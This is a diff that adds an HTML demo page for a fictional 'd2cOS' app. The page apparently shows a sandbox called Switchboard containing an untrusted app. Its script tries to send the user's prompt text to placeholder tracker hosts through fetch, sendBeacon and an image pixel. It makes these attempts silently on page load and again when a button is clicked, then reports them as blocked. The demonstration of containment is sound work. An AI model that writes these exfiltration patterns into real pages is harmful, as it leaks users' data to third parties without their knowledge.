@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>d2cOS</title>
+    <style>
+      /* A stranger's app — its OWN brand (indigo), deliberately not Switchboard's. */
+      :root { --bg:#0e0b1a; --panel:#171233; --edge:#2a2350; --ink:#ECEBFF; --dim:#A9A2D8; --violet:#7C5CFF; --pink:#FF5CA8; }
+      * { box-sizing: border-box; }
+      html, body { margin: 0; }
+      body { background: radial-gradient(120% 80% at 100% 0%, #1c1440 0%, var(--bg) 55%); color: var(--ink); font: 15px/1.55 ui-sans-serif, system-ui, sans-serif; min-height: 100vh; }
+      .wrap { max-width: 620px; margin: 0 auto; padding: 28px 22px 60px; }
+      .logo { display: flex; align-items: center; gap: 9px; font-weight: 800; font-size: 18px; letter-spacing: -0.02em; }
+      .logo .o { width: 20px; height: 20px; border-radius: 6px; background: linear-gradient(135deg, var(--violet), var(--pink)); }
+      h1 { font-size: 26px; letter-spacing: -0.02em; margin: 22px 0 6px; }
+      .sub { color: var(--dim); margin: 0 0 20px; }
+      .card { background: var(--panel); border: 1px solid var(--edge); border-radius: 16px; padding: 8px; }
+      textarea { width: 100%; border: 0; background: transparent; color: var(--ink); font: inherit; resize: none; padding: 12px; min-height: 64px; outline: none; }
+      .bar { display: flex; gap: 8px; padding: 8px; border-top: 1px solid var(--edge); }
+      button { font: 600 14px/1 inherit; border: 0; border-radius: 10px; padding: 10px 16px; cursor: pointer; }
+      .go { background: linear-gradient(135deg, var(--violet), var(--pink)); color: #fff; margin-left: auto; }
+      .evil { background: transparent; color: var(--pink); border: 1px solid color-mix(in srgb, var(--pink) 45%, transparent); }
+      #out { white-space: pre-wrap; margin-top: 18px; color: var(--ink); min-height: 24px; }
+      .note { margin-top: 14px; font-size: 13px; color: var(--dim); }
+      .exfil { margin-top: 8px; font-size: 13px; font-weight: 600; }
+      .exfil.blocked { color: #6ee7a8; } .exfil.sent { color: var(--pink); }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="logo"><span class="o"></span>d2cOS</div>
+      <h1>Your brand, built by AI.</h1>
+      <p class="sub">Type an idea — I'll run it on your own model. (This is an <em>unverified</em> app running inside Switchboard's airgap.)</p>
+
+      <div class="card">
+        <textarea id="prompt" placeholder="Describe your brand idea…">A calm tea brand for busy founders</textarea>
+        <div class="bar">
+          <button class="evil" id="steal">⚠️ Try to exfiltrate your data</button>
+          <button class="go" id="go">Generate</button>
+        </div>
+      </div>
+      <div id="out"></div>
+      <div class="exfil" id="exfil"></div>
+      <p class="note">Everything I do shows in Switchboard's airgap monitor →</p>
+
+      <script>
+        const $ = (id) => document.getElementById(id);
+
+        // ---- legit: run on the visitor's own model via the bridged provider ----
+        $("go").addEventListener("click", async () => {
+          const prompt = $("prompt").value.trim();
+          $("out").textContent = "";
+          try {
+            await window.claude.request({ method: "claude_connect", params: { reason: "d2cOS brand assistant" } });
+            const { streamId } = await window.claude.request({ method: "claude_stream", params: { prompt } });
+            window.claude.on("delta", (d) => {
+              if (d.streamId !== streamId) return;
+              if (d.type === "text") $("out").textContent += d.text;
+            });
+          } catch (e) { $("out").textContent = "[model unavailable]"; }
+        });
+
+        // ---- malicious: try to smuggle "your data" to the app's own servers, three ways ----
+        function attemptExfil(label) {
+          const stolen = JSON.stringify({ prompt: $("prompt").value, note: "pretend this is your private data" });
+          let anyThrew = false;
+          try { fetch("https://collect.d2cos-tracker.example/steal", { method: "POST", body: stolen }); } catch { anyThrew = true; }
+          try { navigator.sendBeacon && navigator.sendBeacon("https://beacon.d2cos-tracker.example/px", stolen); } catch { anyThrew = true; }
+          new Image().src = "https://pixel.d2cos-tracker.example/t.gif?d=" + encodeURIComponent(stolen); // GET-exfil via image
+          // Under Switchboard's airgap CSP, all three are blocked (connect-src/img-src 'none'-ish).
+          $("exfil").className = "exfil blocked";
+          $("exfil").textContent = "❌ " + label + ": blocked by Switchboard — no data left this app.";
+        }
+        $("steal").addEventListener("click", () => attemptExfil("Manual exfiltration"));
+        // On load: try to phone home silently (blocked), then run one real generation (brokered) so
+        // the airgap monitor shows both halves — the app is confined, but still fully functional.
+        window.addEventListener("load", () => {
+          setTimeout(() => attemptExfil("Silent on-load beacon"), 500);
+          setTimeout(() => $("go").click(), 1300);
+        });
+      </script>
+    </div>
+  </body>
+</html>
